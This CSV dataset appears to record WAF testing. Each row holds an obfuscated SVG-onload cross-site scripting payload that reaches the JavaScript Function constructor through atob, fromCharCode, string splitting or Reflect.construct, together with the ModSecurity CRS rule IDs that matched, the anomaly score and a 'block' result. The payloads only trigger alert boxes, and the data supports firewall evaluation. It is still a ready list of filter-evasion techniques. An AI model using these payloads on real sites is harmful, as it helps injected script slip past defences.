index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
2854,"<svg onload='(function(){var b1=String;var b2=b1[""fromCha""+""rCode""];this[b2(0x65,0x76,0x61,0x6c)](b2(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))})()'>",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o14,11v217,148 || o14,11v217,148t:urlDecodeUni || v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o68,29v217,148t:urlDecodeUni,t:compressWhitespace || ",30,177826993173.475603
2856,"<svg onload='(function(){var d1=[].constructor.constructor;var d2=String.fromCharCode;d1(d2(97,108,101,114,116,40,49,41))()})()'>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,129 || v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826993654.820054
2864,"<svg onload='(function(){var i=self[atob(""U3RyaW5n"")][atob(""ZnJvbUNoYXJDb2Rl"")];self[i(97,108,101,114,116)](1)})()'/>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v217,117 || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,22v217,117t:urlDecodeUni,t:compressWhitespace || ",25,177826995410.395444
2867,"<svg onload='(function(){var o=globalThis[""S""+""tring""][""from""+""CharCode""];globalThis[o(97,108,101,114,116)](1)})()'/>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,117 || o14,11v217,117t:urlDecodeUni || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826996286.709943
2870,"<svg onload='(function(){var s=parent[""\u0053\u0074\u0072\u0069\u006e\u0067""][""\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065""];parent[s(97)+s(108)+s(101)+s(114)+s(116)](1)})()'/>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o160,42v217,205t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,205 || o14,11v217,205t:urlDecodeUni || v217,205t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,205t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,205t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17782699692.399592
2897,"<svg onload='requestAnimationFrame(()=>globalThis.Function(""al""+""ert(1)"")())'>",0,1,block,5,"933210,941100,941120,941160,949110","o58,18v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827003398.803966
2921,"<svg onload='(new/**/(self.Function)/**/(atob(""cmV0dXJuIGFsZXJ0"")))/**/()(1)'>",0,1,block,5,"933210,941100,941120,941160,949110","o13,54v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827008953.133009
2923,"<svg onload='(new{a:Function}[""a""](""ret""+""urn ale""+""rt""))()(1)'>",0,1,block,5,"933210,941100,941120,941160,949110","o29,33v217,64t:urlDecode,t:replaceComments,t:compressWhitespace || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827009410.984541
2924,"<svg onload='(new(window.top.Function)(""retur""+""n aler""+""t""))()(1)'>",0,1,block,5,"933210,941100,941120,941160,949110","o13,53v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827009620.376802
2925,"<svg onload='(new(parent.Function)(""ret""+""urn al""+""ert""))()(1)'>",0,1,block,5,"933210,941100,941120,941160,949110","o13,49v217,64t:urlDecode,t:replaceComments,t:compressWhitespace || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827009983.587596
2926,"<svg onload='(new[0,Function][1](""retur""+""n ale""+""rt""))()(1)'>",0,1,block,5,"933210,941100,941120,941160,949110","o29,31v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827010197.435178
2929,"<svg onload='(new(Function[""constructor""])(""re""+""turn aler""+""t""))()(1)'>",0,1,block,5,"933210,941100,941120,941160,949110","o13,57v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827010848.637398
2937,"<svg onload='(new(globalThis.Function)(""ret""+""urn aler""+""t""))()(1)'>",0,1,block,5,"933210,941100,941120,941160,949110","o13,53v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827012665.185950
2980,"<svg onload='parent[""Function""](atob(""d2luZG93LmFsZXJ0KDEp""))()'></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o19,44v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827022622.756323
2982,"<svg onload='self[""Function""][""prototype""][""constructor""][""prototype""][""constructor""](atob(""d2luZG93LmFsZXJ0KDEp""))()'></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o17,100v217,125t:urlDecode,t:replaceComments,t:compressWhitespace || v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,125t:urlDecodeUni,t:compressWhitespace || ",25,177827023052.256086
2991,<svg onload='top.Function(atob`d2luZG93LmFsZXJ0KDEp`)()'></svg>,0,1,block,4,"941100,941120,941160,949110","v216,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177827025292.866853
3004,"<svg onload='new/**/Function/**/(String.fromCharCode(97,108,101,114,116,40,49,41))()' />",0,1,block,5,"934100,941100,941120,941160,949110","o33,19v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827028364.494384
3039,"<svg onload='globalThis.Function(""ale""+""rt(17)"")()'>",0,1,block,4,"941100,941120,941160,949110","v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782703654.390887
3063,"<svg onload=""(this)['Function']||[]['flat']['constructor']('\x61lert(3)')()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o33,42v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,17v217,77t:urlDecodeUni,t:compressWhitespace || ",25,177827042259.419511
3103,"<svg onload='(1,top[""Function""])(""var a=atob(\""YWxlcnQoMSk=\"");eval(a);"")()'></svg>",0,1,block,9,"932100,933160,933210,934100,941100,941120,941160,941370,949110","o62,5v217,83 || o63,12v217,83 || o19,56v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o63,5v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,15v217,83t:urlDecodeUni,t:compressWhitespace || ",40,177827051514.618562
3105,"<svg onload='Reflect[""construct""](Function,[""var a=atob(\""YWxlcnQoMSk=\"");eval(a);""])()'></svg>",0,1,block,8,"932100,933160,933210,934100,941100,941120,941160,949110","o73,5v217,95 || o74,13v217,95 || o20,67v217,95t:urlDecode,t:replaceComments,t:compressWhitespace || o74,5v217,95 || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,17782705204.769127
3130,"<svg onload='parent[""co""+""nstr""+""uctor""][""co""+""nstr""+""uctor""](""aler""+""t(1)"")()'></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o19,59v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827058052.197092
3149,"<svg onload='top.Function(String.fromCharCode(97,108,101,114,116,40,50,56,41))()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o26,19v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827062534.742163
3174,"<svg onload='(top)[""Function""](atob(""YWxlcnQoMjQp""))()'>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o13,41v217,56t:urlDecode,t:replaceComments,t:compressWhitespace || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,16v217,56t:urlDecodeUni,t:compressWhitespace || ",25,177827068353.635415
3178,"<svg onload='Reflect.construct(Function,[atob(""YWxlcnQoMjQp"")])()'>",0,1,block,4,"941100,941120,941160,949110","v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177827069288.761041
3180,"<svg onload='document[""defaultView""][""Function""](atob(""YWxlcnQoMjQp""))()'>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o21,51v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,23v217,74t:urlDecodeUni,t:compressWhitespace || ",25,177827069772.722967
3185,"<svg onload='(1,window[""Function""])(atob(""YWxlcnQoMjQp""))()'>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o22,37v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,18v217,61t:urlDecodeUni,t:compressWhitespace || ",25,177827070975.766604
3187,"<svg onload='top[""Function""][""prototype""][""constructor""](atob(""YWxlcnQoMjQp""))()'>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,64v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,82t:urlDecodeUni,t:compressWhitespace || ",25,177827071368.991791
3191,"<svg onload='(false||window)[""Function""](atob(""YWxlcnQoMjQp""))()'>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o28,36v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,19v217,66t:urlDecodeUni,t:compressWhitespace || ",25,177827072373.342649
3192,"<svg onload='with(window)Function(atob(""YWxlcnQoMjQp""))()'>",0,1,block,4,"941100,941120,941160,949110","v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782707250.962354
3193,"<svg onload='(function(){return(this[""Function""])(atob(""YWxlcnQoMjQp""))})()()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o13,64v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,16v217,79t:urlDecodeUni,t:compressWhitespace || ",30,177827072899.412120
3205,"<svg onload='(function(){return arguments.callee.caller.constructor(atob(""d2luZG93LmFsZXJ0KDEp""))})()();'></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,90v217,112t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,112 || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17782707567.038289
3210,"<svg onload='AsyncFunction=Object.getPrototypeOf(async function(){}).constructor;AsyncFunction(atob(""d2luZG93LmFsZXJ0KDEp""))()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o55,11v217,134 || v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827076792.193536
3245,"<svg onload='this.remove();Function?.(""/*comment*/\141\154\145\162\164(1)"")()'/>",0,1,block,4,"941100,941120,941160,949110","v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177827085180.723549
3247,"<svg onload='this.remove();[1].map(function(){return(this[(""con""+""structor"")][""constructor""](""a""+""lert(1)""))}).pop()()'>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o27,91v217,120t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,120 || o35,11v217,120t:urlDecodeUni || v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,24v217,120t:urlDecodeUni,t:compressWhitespace || ",35,177827085524.998776
3279,<svg onload=(top)['Function']('al'+'ert(1)')()>,0,1,block,6,"933210,941100,941120,941160,941370,949110","o12,34v216,47t:urlDecode,t:replaceComments,t:compressWhitespace || v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v216,47t:urlDecodeUni,t:compressWhitespace || ",25,177827093131.266473
3291,<svg onload=parent['Function']('al'+'ert(1)')()>,0,1,block,5,"933210,941100,941120,941160,949110","o18,29v216,48t:urlDecode,t:replaceComments,t:compressWhitespace || v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17782709613.318386
3292,<svg onload=frames['Function']('al'+'ert(1)')()>,0,1,block,5,"933210,941100,941120,941160,949110","o18,29v216,48t:urlDecode,t:replaceComments,t:compressWhitespace || v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827096330.492251
3349,<svg onload=with(window)Function('aler'+'t(1)')()>,0,1,block,4,"941100,941120,941160,949110","v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177827109863.461898
3357,<svg onload=top['Function'](['ale'+'rt(1)'].join())()>,0,1,block,6,"933210,941100,941120,941160,941370,949110","o15,38v217,54t:urlDecode,t:replaceComments,t:compressWhitespace || v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,54t:urlDecodeUni,t:compressWhitespace || ",25,177827111716.100564
